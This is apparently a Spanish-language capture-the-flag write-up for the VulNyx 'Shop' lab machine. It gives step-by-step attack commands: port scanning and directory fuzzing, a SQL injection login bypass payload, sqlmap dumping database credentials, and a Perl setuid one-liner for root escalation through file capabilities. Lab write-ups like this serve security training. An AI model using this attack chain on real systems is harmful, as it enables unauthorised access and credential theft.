![image](https://github.com/user-attachments/assets/95a3a335-4a51-48e0-adf6-c4e47c37b896)



```markdown
# Máquina Shop - VulNyx (Dificultad: Easy)

## Descripción
Shop es una máquina de la plataforma VulNyx con un nivel de dificultad **Easy**. En este laboratorio, se explora una vulnerabilidad de **inyección SQL (SQLi)** en un panel de administración web, se obtienen credenciales de la base de datos y se realiza una escalada de privilegios aprovechando las **capabilities** de un binario. El objetivo es obtener acceso root a la máquina y encontrar la flag.

## Resumen de conceptos trabajados
- Escaneo de puertos con Nmap.
- Descubrimiento de directorios web.
- Explotación de una vulnerabilidad de inyección SQL (SQLi).
- Escalada de privilegios mediante capabilities (Perl).

---

## Pasos para la resolución

### **1. Conexión y verificación**
- Iniciar sesión como root en la máquina atacante:
  ```bash
  sudo su
  ```
- Crear una carpeta para la máquina Shop:
  ```bash
  mkdir Shop
  cd Shop
  ```
- Verificar la conexión con la máquina víctima:
  ```bash
  arp-scan -I eth0 --localnet
  ping -c 1 192.168.64.140 -R
  ```
  El TTL de 64 indica que es una máquina Linux.

---

### **2. Escaneo de puertos**
- Realizar un escaneo de puertos con Nmap:
  ```bash
  nmap -p- -sSCV --open --min-rate 5000 -vvv -n -Pn 192.168.64.140 -oN escaneo
  ```
  Se detectan los puertos **22 (SSH)** y **80 (HTTP)** abiertos.

- Analizar el servicio HTTP en el puerto 80:
  - Acceder a la web desde el navegador:
    ```
    http://192.168.64.140
    ```
  - La web parece ser un ecommerce sin funcionalidades aparentes.
  - Usar **Wappalyzer** o **whatweb** para identificar tecnologías:
    ```bash
    whatweb 192.168.64.140
    ```
    Se identifica un servidor **Apache 2.4.38** y **jQuery 1.10.2**.

---

### **3. Descubrimiento de directorios**
- Realizar fuzzing de directorios con **dirb** o **gobuster**:
  ```bash
  gobuster dir -u http://192.168.64.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
  Se encuentra el directorio **/administrator**, que contiene un panel de login.

---

### **4. Explotación de SQL Injection (SQLi)**
- Identificar que el panel de login es vulnerable a SQLi:
  - Probar inyecciones básicas como:
    ```sql
    ' OR '1'='1'; --
    ```
- Usar **sqlmap** para automatizar la explotación:
  ```bash
  sqlmap -u http://192.168.64.140/administrator/ --forms --batch --dump
  ```
  - Se detecta que la aplicación es vulnerable a **SQL Blind**.
  - Se extraen credenciales de la base de datos:
    ```
    Usuario: bart
    Contraseña: [contraseña obtenida]
    ```

---

### **5. Acceso SSH**
- Usar las credenciales obtenidas para acceder por SSH:
  ```bash
  ssh bart@192.168.64.140
  ```
  Se obtiene acceso a la máquina como el usuario **bart**.

---

### **6. Escalada de privilegios**

#### **Búsqueda de capabilities**
- Buscar binarios con capabilities especiales:
  ```bash
  /usr/sbin/getcap -r / 2>/dev/null
  ```
  Se identifica que **Perl** tiene la capacidad **cap_setuid+ep**, lo que permite escalar privilegios.

#### **Explotación de Perl**
- Usar **GTFOBins** para escalar privilegios con Perl:
  ```bash
  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
  ```
  Se obtiene una shell con privilegios de **root**.

---

### **7. Obtención de la flag**
- Buscar la flag en el directorio `/root`:
  ```bash
  cd /root
  cat root.txt
  ```

---

## Resumen
Para resolver la máquina Shop:
1. Se realizó un escaneo de puertos, identificando los servicios SSH y HTTP.
2. Se descubrió un panel de administración vulnerable a SQLi en el directorio `/administrator`.
3. Se explotó la vulnerabilidad de SQLi con **sqlmap**, obteniendo credenciales de la base de datos.
4. Se accedió a la máquina por SSH con las credenciales obtenidas.
5. Se escalaron privilegios aprovechando las capabilities de Perl.
6. Finalmente, se localizó la flag en el directorio `/root`.

Este laboratorio demuestra cómo una vulnerabilidad de inyección SQL y una configuración insegura de capabilities pueden permitir el control total de un sistema.

---

## Herramientas utilizadas
- **Nmap**: Para escaneo de puertos y detección de servicios.
- **Gobuster**: Para descubrimiento de directorios web.
- **sqlmap**: Para explotación de la vulnerabilidad de SQLi.
- **Perl**: Para escalada de privilegios mediante capabilities.

---

